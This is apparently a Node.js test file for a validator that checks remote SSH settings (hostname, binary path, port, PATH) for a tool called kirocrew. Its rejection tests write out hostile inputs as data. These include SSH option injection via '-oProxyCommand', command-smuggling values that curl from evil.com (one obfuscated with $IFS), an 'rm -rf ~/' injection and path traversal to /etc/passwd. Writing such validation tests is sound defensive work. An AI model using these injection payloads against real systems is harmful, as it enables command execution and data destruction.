const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { HOSTNAME_RE, BINPATH_RE, REMOTE_PORT_RE, REMOTE_PATH_RE, validateRemoteSettings } = require("../validation");

describe("HOSTNAME_RE", () => {
  it("accepts valid corp hostnames", () => {
    assert.ok(HOSTNAME_RE.test("myhost.corp.example.com"));
    assert.ok(HOSTNAME_RE.test("dev-dsk-user-2b-abc123.us-west-2.example.com"));
    assert.ok(HOSTNAME_RE.test("cm-armdev.corp.example.com"));
  });

  it("accepts SSH config aliases (single-word, no dot required)", () => {
    assert.ok(HOSTNAME_RE.test("a"));
    assert.ok(HOSTNAME_RE.test("localhost"));
    assert.ok(HOSTNAME_RE.test("clouddesk"));
    assert.ok(HOSTNAME_RE.test("dev-box"));
  });

  it("rejects dangerous hostnames", () => {
    // SSH option injection
    assert.ok(!HOSTNAME_RE.test("-evil.com"));
    assert.ok(!HOSTNAME_RE.test("-oProxyCommand=bad"));
    // Shell metacharacters
    assert.ok(!HOSTNAME_RE.test("host;evil.com"));
    assert.ok(!HOSTNAME_RE.test("host$(cmd).com"));
    assert.ok(!HOSTNAME_RE.test("host`cmd`.com"));
    assert.ok(!HOSTNAME_RE.test("host|pipe.com"));
    // Invalid DNS
    assert.ok(!HOSTNAME_RE.test("a..b"));
    assert.ok(!HOSTNAME_RE.test("-host.example.com"));
    assert.ok(!HOSTNAME_RE.test("host-.example.com"));
  });

  it("accepts shortest valid FQDN (a.b)", () => {
    assert.ok(HOSTNAME_RE.test("a.b"));
  });
});

describe("BINPATH_RE", () => {
  it("accepts valid binary paths", () => {
    assert.ok(BINPATH_RE.test("~/.local/bin/kirocrew"));
    assert.ok(BINPATH_RE.test("/usr/local/bin/kirocrew"));
    assert.ok(BINPATH_RE.test("kirocrew"));
    assert.ok(BINPATH_RE.test("$HOME/.local/bin/kirocrew"));
  });

  it("rejects paths starting with dash", () => {
    assert.ok(!BINPATH_RE.test("-o"));
    assert.ok(!BINPATH_RE.test("-oProxyCommand=evil"));
  });

  it("rejects paths with spaces", () => {
    assert.ok(!BINPATH_RE.test("/opt/my tools/kirocrew"));
    assert.ok(!BINPATH_RE.test("kirocrew token"));
  });

  it("accepts paths with single dots (current dir)", () => {
    assert.ok(BINPATH_RE.test("./bin/kirocrew"));
    assert.ok(BINPATH_RE.test("/usr/./bin/kirocrew"));
  });

  it("rejects paths with shell metacharacters", () => {
    assert.ok(!BINPATH_RE.test("x;curl evil.com"));
    assert.ok(!BINPATH_RE.test("$(curl evil.com)"));
    assert.ok(!BINPATH_RE.test("x|bash"));
    assert.ok(!BINPATH_RE.test("x`id`"));
    assert.ok(!BINPATH_RE.test("curl$IFS-o$IFS/tmp/x$IFShttp//evil.com"));
    assert.ok(!BINPATH_RE.test("$IFS"));
    assert.ok(!BINPATH_RE.test("$PATH"));
    assert.ok(!BINPATH_RE.test("$HOMEevil"));
  });
});


describe("REMOTE_PORT_RE", () => {
  it("accepts valid port numbers", () => {
    assert.ok(REMOTE_PORT_RE.test("1"));
    assert.ok(REMOTE_PORT_RE.test("7778"));
    assert.ok(REMOTE_PORT_RE.test("65535"));
  });

  it("rejects non-numeric input", () => {
    assert.ok(!REMOTE_PORT_RE.test("abc"));
    assert.ok(!REMOTE_PORT_RE.test("7778;evil"));
    assert.ok(!REMOTE_PORT_RE.test("78 80"));
    assert.ok(!REMOTE_PORT_RE.test(""));
  });
});

describe("REMOTE_PATH_RE", () => {
  it("accepts valid PATH strings", () => {
    assert.ok(REMOTE_PATH_RE.test("~/.toolbox/bin:/usr/bin:/bin"));
    assert.ok(REMOTE_PATH_RE.test("~/.toolbox/bin"));
    assert.ok(REMOTE_PATH_RE.test("/usr/local/bin:/usr/bin"));
    assert.ok(REMOTE_PATH_RE.test("~/custom/bin"));
  });

  it("rejects shell metacharacters", () => {
    assert.ok(!REMOTE_PATH_RE.test("~/bin; rm -rf ~/"));
    assert.ok(!REMOTE_PATH_RE.test("~/bin$(evil)"));
    assert.ok(!REMOTE_PATH_RE.test("~/bin`id`"));
    assert.ok(!REMOTE_PATH_RE.test("~/bin|pipe"));
    assert.ok(!REMOTE_PATH_RE.test("~/bin && evil"));
  });

  it("rejects paths starting with dash", () => {
    assert.ok(!REMOTE_PATH_RE.test("-evil"));
  });
});

describe("validateRemoteSettings", () => {
  it("returns null for valid settings", () => {
    assert.equal(validateRemoteSettings("myhost.corp.example.com", "~/.local/bin/kirocrew"), null);
    assert.equal(validateRemoteSettings("myhost.corp.example.com", "$HOME/.local/bin/kirocrew"), null);
  });

  it("returns null for empty host (skips remote)", () => {
    assert.equal(validateRemoteSettings("", "~/.local/bin/kirocrew"), null);
  });

  it("returns null for empty bin (uses default)", () => {
    assert.equal(validateRemoteSettings("myhost.corp.example.com", ""), null);
  });

  it("accepts SSH config alias as hostname", () => {
    assert.equal(validateRemoteSettings("clouddesk", "/usr/bin/kirocrew"), null);
    assert.equal(validateRemoteSettings("dev-box", "~/.toolbox/bin/kirocrew"), null);
  });

  it("rejects hostname with SSH option injection", () => {
    const err = validateRemoteSettings("-oProxyCommand=evil", "/usr/bin/kirocrew");
    assert.ok(err);
  });

  it("rejects bin path starting with dash", () => {
    const err = validateRemoteSettings("host.example.com", "-oProxyCommand=evil");
    assert.ok(err);
    assert.ok(err.includes("dash"));
  });

  it("rejects bin path with shell metacharacters", () => {
    const err = validateRemoteSettings("host.example.com", "x;curl evil.com");
    assert.ok(err);
  });

  it("rejects bin path with spaces", () => {
    const err = validateRemoteSettings("host.example.com", "/opt/my tools/kirocrew");
    assert.ok(err);
  });

  it("rejects bin path with path traversal", () => {
    assert.ok(validateRemoteSettings("host.example.com", "../../bin/evil"));
    assert.ok(validateRemoteSettings("host.example.com", "~/../../../etc/passwd"));
  });

  it("rejects hostname with consecutive dots", () => {
    assert.ok(validateRemoteSettings("a..b", "/usr/bin/kirocrew"));
  });

  it("rejects hostname over 253 chars", () => {
    const long = "a" + ".bb".repeat(84) + ".c";  // > 253 chars
    assert.ok(validateRemoteSettings(long, "/usr/bin/kirocrew"));
  });

  it("validates remotePort as numeric 1-65535", () => {
    assert.equal(validateRemoteSettings("host.com", "", "7778", ""), null);
    assert.ok(validateRemoteSettings("host.com", "", "0", ""));
    assert.ok(validateRemoteSettings("host.com", "", "99999", ""));
    assert.ok(validateRemoteSettings("host.com", "", "7778;evil", ""));
    assert.ok(validateRemoteSettings("host.com", "", "abc", ""));
  });

  it("validates remotePath rejects injection", () => {
    assert.equal(validateRemoteSettings("host.com", "", "", "~/.toolbox/bin:/usr/bin:/bin"), null);
    assert.ok(validateRemoteSettings("host.com", "", "", "~/bin; rm -rf ~/"));
    assert.ok(validateRemoteSettings("host.com", "", "", "~/a/../../../etc"));
    assert.ok(validateRemoteSettings("host.com", "", "", "$(evil)"));
  });
});
